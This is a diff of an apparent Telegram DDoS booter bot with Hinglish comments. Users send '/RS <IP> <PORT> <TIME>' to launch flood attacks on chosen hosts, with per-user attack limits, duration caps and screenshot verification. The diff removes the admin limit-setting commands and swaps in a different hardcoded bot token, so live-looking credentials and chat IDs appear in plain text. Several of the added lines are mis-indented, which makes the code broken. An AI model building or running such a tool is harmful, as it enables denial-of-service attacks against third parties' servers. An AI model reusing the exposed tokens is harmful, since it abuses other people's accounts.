@@ -5,20 +5,18 @@ import subprocess
 import threading
 
 # ✅ TELEGRAM BOT TOKEN
-bot = telebot.TeleBot(''7053228704:AAGLAJFlzJ6M2XZC9HEABD6B5PVubnd-FqY)
+bot = telebot.TeleBot('8111473127:AAGdUoAxw0bvdwtWezRjQ7hMVvKQYT_RO3k')
 
 # ✅ GROUP & CHANNEL SETTINGS
 GROUP_ID = "-1002369239894"
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
 ADMINS = ["7129010361"]
-ADMINS = [7129010361]
 
 # ✅ GLOBAL VARIABLES
 active_attacks = {}  # अटैक स्टेटस ट्रैक करेगा
 pending_verification = {}  # वेरिफिकेशन के लिए यूजर्स लिस्ट
 user_attack_count = {}
 MAX_ATTACKS = 2  # (या जो भी लिमिट चाहिए)
-MAX_DURATION = 100
 
 # ✅ CHECK IF USER IS IN CHANNEL
 def is_user_in_channel(user_id):
@@ -29,7 +27,7 @@ def is_user_in_channel(user_id):
         return False
 
 # ✅ HANDLE ATTACK COMMAND
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['RS'])
 def handle_attack(message):
     user_id = message.from_user.id
     command = message.text.split()
@@ -48,13 +46,15 @@ def handle_attack(message):
         return
 
     # ✅ अटैक लिमिट चेक करो
-    user_active_attacks = sum(1 for uid in active_attacks.keys() if uid == user_id)
-    if user_active_attacks >= MAX_ATTACKS:
-        bot.reply_to(message, f"⚠️ **ATTACK LIMIT ({MAX_ATTACKS}) POORI HO CHUKI HAI!**\n👉 **PEHLE PURANE KHATAM HONE DO! /check KARO!**")
-        return
+    if user_id not in active_attacks:
+         active_attacks[user_id] = []  # Initialize an empty list for the user
+
+   if len(active_attacks[user_id]) >= MAX_ATTACKS:
+       bot.reply_to(message, "❌ MAXIMUM 2 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
+       return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **USAGE:** `/bgmi <IP> <PORT> <TIME>`")
+        bot.reply_to(message, "⚠️ **USAGE:** `/RS <IP> <PORT> <TIME>`")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -66,9 +66,9 @@ def handle_attack(message):
         bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
         return
 
-    if time_duration > MAX_DURATION:  # Use admin-set MAX_DURATION
-         bot.reply_to(message, f"🚫 MAX ATTACK TIME IS {MAX_DURATION} SECONDS!")
-         return
+    if time_duration > 120:
+        bot.reply_to(message, "🚫 **120S SE ZYADA ALLOWED NAHI HAI!**")
+        return
 
     # ✅ पहले ही वेरिफिकेशन सेट कर दो ताकि यूजर तुरंत स्क्रीनशॉट भेज सके
     pending_verification[user_id] = True
@@ -130,48 +130,6 @@ def verify_screenshot(message):
     del pending_verification[user_id]  # ✅ अब यूजर अटैक कर सकता है
     bot.reply_to(message, "✅ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")
 
-# ✅ ADMIN COMMAND TO SET MAX ATTACKS
-@bot.message_handler(commands=['setmaxattacks'])
-def set_max_attacks(message):
-    user_id = message.from_user.id
-
-    if user_id not in ADMINS:
-        bot.reply_to(message, "🚫 **SIRF ADMIN HI MAX ATTACKS SET KAR SAKTA HAI!**")
-        return
-
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "⚠️ **USAGE:** `/setmaxattacks <number>`")
-        return
-
-    try:
-        global MAX_ATTACKS
-        MAX_ATTACKS = int(command[1])
-        bot.reply_to(message, f"✅ **MAX ATTACKS UPDATED!**\n🔹 MAX ATTACKS: `{MAX_ATTACKS}`")
-    except ValueError:
-        bot.reply_to(message, "❌ **INVALID INPUT! SIRF NUMBER DALO!**")
-
-# ✅ ADMIN COMMAND TO SET MAX DURATION
-@bot.message_handler(commands=['setmaxduration'])
-def set_max_duration(message):
-    user_id = message.from_user.id
-
-    if user_id not in ADMINS:
-        bot.reply_to(message, "🚫 **SIRF ADMIN HI MAX DURATION SET KAR SAKTA HAI!**")
-        return
-
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "⚠️ **USAGE:** `/setmaxduration <seconds>`")
-        return
-
-    try:
-        global MAX_DURATION
-        MAX_DURATION = int(command[1])
-        bot.reply_to(message, f"✅ **MAX DURATION UPDATED!**\n🔹 MAX DURATION: `{MAX_DURATION} SECONDS`")
-    except ValueError:
-        bot.reply_to(message, "❌ **INVALID INPUT! SIRF NUMBER DALO!**")
-
 # ✅ ATTACK STATS COMMAND
 @bot.message_handler(commands=['check'])
 def attack_stats(message):
@@ -179,23 +137,26 @@ def attack_stats(message):
     now = datetime.datetime.now()
 
     for user in list(active_attacks.keys()):
-        if active_attacks[user][2] <= now:
-            del active_attacks[user]
+        if isinstance(active_attacks[user], tuple) and len(active_attacks[user]) >= 3:
+            if active_attacks[user][2] <= now:
+                del active_attacks[user]
 
     if not active_attacks:
         bot.reply_to(message, "📊 **FILHAAL KOI ACTIVE ATTACK NAHI CHAL RAHA!** ❌")
         return
 
     stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
-    for user, (target, port, end_time) in active_attacks.items():
-        remaining_time = (end_time - now).total_seconds()
-        stats_message += (
-            f"👤 **USER ID:** `{user}`\n"
-            f"🎯 **TARGET:** `{target}`\n"
-            f"📍 **PORT:** `{port}`\n"
-            f"⏳ **ENDS IN:** `{int(remaining_time)}s`\n"
-            f"🕒 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
-        )
+    for user, attack_data in active_attacks.items():
+        if isinstance(attack_data, tuple) and len(attack_data) >= 3:
+            target, port, end_time = attack_data
+            remaining_time = (end_time - now).total_seconds()
+            stats_message += (
+                f"👤 **USER ID:** `{user}`\n"
+                f"🎯 **TARGET:** `{target}`\n"
+                f"📍 **PORT:** `{port}`\n"
+                f"⏳ **ENDS IN:** `{int(remaining_time)}s`\n"
+                f"🕒 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
+            )
 
     bot.reply_to(message, stats_message, parse_mode="Markdown")
 
